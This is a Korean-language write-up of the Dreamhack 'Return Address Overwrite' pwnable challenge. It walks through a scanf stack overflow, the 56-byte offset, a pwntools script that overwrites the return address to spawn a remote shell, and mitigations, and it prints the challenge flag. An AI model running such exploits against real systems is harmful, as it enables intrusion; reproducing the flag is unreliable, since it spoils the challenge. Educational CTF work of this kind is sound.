# Return Address Overwrite (rao) 문제 풀이 보고서

## 1. 개요
- **문제:** Dreamhack Wargame - Return Address Overwrite (Challenge 351)
- **분야:** System Hacking (Pwnable)

---

## 2. 취약점 분석 (Vulnerability Analysis)

### 2.1 소스 코드 분석 (`rao.c`)
제공된 C 소스 코드를 분석한 결과, `main` 함수 내에서 사용자 입력을 처리하는 과정에 치명적인 보안 취약점이 존재함을 확인했다.

```c
void get_shell() {
    char *cmd = "/bin/sh";
    char *args[] = {cmd, NULL};
    execve(cmd, args, NULL);
}

int main() {
    char buf[0x30];

    init();

    printf("Input: ");
    scanf("%s", buf); // 크기 제한 없이 입력을 받는 취약한 함수 사용

    return 0;
}
```

### 2.2 스택 레이아웃 및 거리 계산
x64 아키텍처 환경에서 `main` 함수가 호출될 때 스택 메모리의 구조는 다음과 같이 배치된다.

| 구조 영역 | 크기 | 설명 |
| :--- | :--- | :--- |
| **`buf`** | `0x30` (48 바이트) | 사용자가 입력한 데이터가 저장되는 공간 |
| **`SFP`** (Saved Frame Pointer) | `8 바이트` | 이전 함수의 Base Pointer 저장 영역 |
| **`Return Address`** | `8 바이트` | 함수가 종료된 후 돌아갈 명령어 주소 (**변조 대상**) |

따라서 `buf`의 시작점부터 `Return Address`에 도달하기 위해 채워야 하는 더미 데이터의 총 크기는 다음과 같이 산출된다.

$$\text{Dummy Size} = \text{buf 크기 (48바이트)} + \text{SFP 크기 (8바이트)} = 56\text{바이트}$$

## 3. 익스플로잇 설계 및 수행 (Exploit Engineering)

### 3.1 목적지 주소 획득
VirtualBox 우분투 환경에서 pwndbg 디버거를 이용하여 대상 바이너리를 동적 분석했다.
타겟 함수인 get_shell의 메모리 시작 주소를 확인한 결과 고정된 절대 주소 0x4006aa임을 알아내었다.

```
pwndbg> print get_shell
$1 = {<text variable, no debug info>} 0x4006aa <get_shell>
```

### 3.2 페이로드 구조 (Payload Structure)
계산한 버퍼 거리를 채울 더미 데이터와 획득한 get_shell 주소 값을 조합하여 페이로드를 설계한다. 64비트 시스템 환경이므로 주소 값은 리틀 엔디언(Little-Endian) 형태로 패킹해야 한다.

$$\text{Payload} = \underbrace{\text{"A"}\times 56}_{\text{Buffer + SFP}} + \underbrace{\text{0x00000000004006aa (p64 변환)}}_{\text{Return Address 변조}}$$

### 3.3 익스플로잇 스크립트 작성 (solve.py)
파이썬의 pwntools 라이브러리를 활용하여 원격 서버에 접속하고 페이로드를 주입하는 자동화 공격 스크립트를 작성했다.

```python
from pwn import *

# 1. 원격 인스턴스 서버 연결
p = remote('host3.dreamhack.games', 17048)

# 2. 페이로드 구성 (더미 데이터 56바이트 + 리틀엔디언으로 패킹된 get_shell 주소)
payload = b'A' * 56
payload += p64(0x4006aa)

# 3. 데이터 전송
p.sendlineafter(b"Input: ", payload)

# 4. 셸 상호작용 모드 전환
p.interactive()
```

## 4. 결과 및 결론

### 4.1 가상머신 테스트 환경 구축 및 트러블슈팅
익스플로잇 도중 최신 우분투 환경의 PEP 668 보안 정책으로 인해 pip3 install pwntools 명령어 실행 시 externally-managed-environment 에러가 발생했다. 이를 해결하기 위해 시스템 패키지 관리 안전 규정을 우회하는 --break-system-packages 옵션을 사용하여 환경 구성을 완료했다.

```
pip3 install pwntools --break-system-packages
```

### 4.2 최종 익스플로잇 결과 및 플래그 획득
환경 구축 후 solve.py 공격 스크립트를 실행한 결과, main 함수의 Return Address가 정상적으로 변조되어 get_shell() 함수가 실행되었으며, 대기 상태 프롬프트($)와 함께 원격 서버의 interactive 셸을 탈취하는 데 성공했다.

최종 획득 플래그(Flag): DH{5f47cd0e441bdc6ce8bf6b8a3a0608dc}

### 4.3 결론 및 대응 방안
본 실험을 통해 입력값의 길이를 검증하지 않는 함수가 메모리 상에서 리턴 주소를 변조하여 프로그램의 제어권을 탈취당하는 과정을 실증했다. 이러한 스택 버퍼 오버플로우를 원천 방어하기 위해서는 컴파일 시 스택 보호 기법(Stack Canary, ASLR 등)을 활성화하거나, 소스 코드 레벨에서 scanf("%s") 대신 입력 데이터의 최대 크기를 엄격하게 제한하는 fgets()나 scanf("%48s")와 같은 안전한 API로 변경하여 방어해야 한다.
